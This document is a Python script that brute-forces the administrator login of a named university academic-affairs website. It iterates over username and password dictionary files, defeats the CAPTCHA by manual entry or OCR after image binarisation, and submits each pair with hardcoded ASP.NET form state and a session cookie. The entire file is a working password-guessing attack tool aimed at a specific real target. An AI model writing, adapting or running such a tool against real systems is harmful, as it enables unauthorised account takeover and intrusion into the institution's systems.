#!/usr/bin/env python
# -*- coding: UTF-8 -*-
'''Risk2S'''
import requests
from PIL import Image
# https://github.com/songluyi/pytesser3
import pytesser3
from bs4 import BeautifulSoup
import os
import multiprocessing

url = "http://jwc.sicnu.edu.cn/admin/login.aspx"
codeurl = "http://jwc.sicnu.edu.cn/admin/Validate.aspx"
# 参数初始值
# 爆破字典https://github.com/rootphantomer/Blasting_dictionary
username = 'admin'
test_u = 'admin'
password = 'root'
test_p = 'root'
code = '0000'
headers = {
	"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",
	"Content-Type": "application/x-www-form-urlencoded",
	"Referer": "http://jwc.sicnu.edu.cn/admin/login.aspx"}

cookies = {
	'Cookie': 'ASP.NET_SessionId=y5wjx4h2zla02z3b3gngvong'
}

post_data = {
	'__VIEWSTATE': "/wEPDwUJOTM1NzIxMTI5D2QWAgIDD2QWAgIBDw8WAh4EVGV4dAUiKiog5o+Q56S66ZSZ6K+v77ya6aqM6K+B56CB6ZSZ6K+vIWRkZGmEyfVSizCFlUzWmpq0MvZusXA0P71fXn2Biz0JeWs6",
	'__EVENTVALIDATION': "82312306",
	'__EVENTVALIDATION': "/wEdAAXlVHPNsMM+vvvlEp/0HzeRDFTzKcXJqLg+OeJ6QAEa2nY2+Mc6SrnAqio3oCKbxYZyS2f5c1XgBSx3nGmY/9ewPOaW1pQztoQA36D1w/+bXeDqyuyA551HX4tXs+8SOVWmkog+AGYh7ylorI7F9Y/E",
	'txtUser': test_u, 'txtPassword': test_p,
	'txtValidate': code, 'btnSubmit': " 登 录 ",
}


# 验证码下载
def get_code(s, codeurl, binary_deal=True, threshold=220):
	# 得到验证码图片
	rcode = s.get(codeurl);
	code = '0000'
	f = open('code.png', 'wb')
	f.write(rcode.content)
	f.close()
	im = Image.open('code.png')
	# 验证码识别
	if binary_deal:
		im = im.convert('L')  # 灰度化
		# 二值化处理	阈值可调，根据out返回情况调整
		# threshold = 220
		table = []
		for i in range(256):
			if i < threshold:
				table.append(0)
			else:
				table.append(1)
		out = im.point(table, '1')
	else:
		out = im
	return out


# 图片显示子进程
def im_show(im):
	im.show()


def mode_by_num(s, n):
	if n == '1':
		im = get_code(s, codeurl)
		p_im = multiprocessing.Process(target=im_show, args=(im,))
		p_im.start()
		code = input("验证码内容为：")
		p_im.join(3)
		return code
	elif n == '2':
		try:
			im = get_code(s, codeurl, False)
			code = pytesser3.image_to_string(im)
		except:
			return 2
		print('验证码为：', code)
		return code
	elif n == '3':
		# 加载模型，预测结果------------------------------------
		pass
		return '0000'
	else:
		return 0


# 获取字典里的用户名和密码
def get_user_pass():
	with open('username.txt', 'r') as u:
		username = u.readlines()
	with open('password.txt', 'r') as p:
		password = p.readlines()
	# 去除其中的换行符
	for i in range(0, len(username)): username[i] = username[i].rstrip('\n')
	for i in range(0, len(password)): password[i] = password[i].rstrip('\n')
	return (username, password)


# 测试用户名，密码
def test_user_pass(s, test_u, test_p, isManualInput):
	# 通过模式选择过程
	code = mode_by_num(s, isManualInput)
	if isinstance(code, str) and code != '':
		post_data['txtValidate'] = code
		post_data['txtUser'] = test_u
		post_data['txtPassword'] = test_p
		r = s.post(url, data=post_data, headers=headers, cookies=cookies)
		print("用户名：", test_u, "密码：", test_p)
		soup = BeautifulSoup(r.text, "lxml")
		# 页面返回情况
		print(soup.td.span.string)
	else:
		print("请重新开始！")
		return 2


def main():
	# 返回文本字典里的用户名和密码
	username, password = get_user_pass()
	# 利用session 保持同步
	s = requests.Session()
	print("请选择验证码识别模式：[模式所对应的数字]")
	print("1-人眼识别模式（通过用户肉眼识别，输入验证码内容。）")
	print("2-Pytesser模式（Google开源库识别，自动识别验证码内容。）")
	print("3-LibSvm模式（模型训练，预测识别，自动识别验证码内容。）")
	isManualInput = input("选择模式：")
	# 双重循环，试用户名、密码
	for test_user in username:
		for test_pass in password:
			excpt_num = test_user_pass(s, test_user, test_pass, isManualInput)
			if excpt_num == 0:
				return 0
			elif excpt_num == 2:
				continue


if __name__ == '__main__':
	main()
